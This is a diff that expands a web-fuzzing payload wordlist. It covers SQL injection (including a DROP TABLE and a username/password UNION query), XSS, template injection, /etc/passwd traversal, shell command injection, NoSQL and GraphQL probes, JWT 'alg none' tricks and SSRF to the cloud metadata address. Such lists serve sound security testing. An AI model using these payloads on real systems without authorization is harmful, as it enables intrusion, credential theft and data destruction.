@@ -1,10 +1,116 @@
+# =========================
+# SQL Injection
+# =========================
 ' OR '1'='1
 " OR "1"="1
+' OR 1=1--
+" OR 1=1--
+1' OR '1'='1
+admin'--
+' UNION SELECT NULL--
+' UNION SELECT username,password FROM users--
+1 OR 1=1#
 1; DROP TABLE users--
-' UNION SELECT null--
-<script>alert(1)</script>
-../../../etc/passwd
-{{7*7}}
-${7*7}
-'; waitfor delay '0:0:5'--
+
+# Time-based SQLi
 1 AND SLEEP(5)
+' OR SLEEP(5)--
+'; WAITFOR DELAY '0:0:5'--
+' OR IF(1=1,SLEEP(5),0)--
+
+# =========================
+# Cross-Site Scripting (XSS)
+# =========================
+<script>alert(1)</script>
+"><script>alert(1)</script>
+'><script>alert(1)</script>
+<img src=x onerror=alert(1)>
+<svg/onload=alert(1)>
+<iframe src=javascript:alert(1)>
+
+# =========================
+# Server-Side Template Injection (SSTI)
+# =========================
+{{7*7}}
+{{config}}
+${7*7}
+${{7*7}}
+<%= 7*7 %>
+#{7*7}
+
+# =========================
+# Local File Inclusion (LFI)
+# =========================
+../../../etc/passwd
+../../../../etc/passwd
+/etc/passwd
+../../../../windows/win.ini
+
+# =========================
+# Command Injection
+# =========================
+; ls
+&& ls
+| ls
+; whoami
+&& whoami
+| whoami
+; id
+&& id
+| id
+`id`
+$(id)
+
+# =========================
+# Path Traversal (Encoded)
+# =========================
+../
+../../
+../../../
+..%2f..%2f..%2fetc%2fpasswd
+%2e%2e/%2e%2e/%2e%2e/etc/passwd
+
+# =========================
+# NoSQL Injection
+# =========================
+{"$ne": null}
+{"$gt": ""}
+{"$regex": ".*"}
+{"$where": "1==1"}
+
+# =========================
+# GraphQL Specific
+# =========================
+{"query":"{__schema{types{name}}}"}
+{"query":"{__type(name:\"User\"){fields{name}}}"}
+{"query":"{users{password}}"}
+{"query":"{__schema{queryType{name}}}"}
+
+# =========================
+# JWT Header Injection Ideas
+# =========================
+{"alg":"none"}
+{"kid":"../../../../etc/passwd"}
+{"kid":"| ls"}
+{"kid":"; whoami"}
+
+# =========================
+# SSRF / Redirect
+# =========================
+http://127.0.0.1
+http://localhost
+http://169.254.169.254
+http://0.0.0.0
+
+# =========================
+# Misc Edge Cases
+# =========================
+null
+undefined
+true
+false
+{}
+[]
+""
+''
+%00
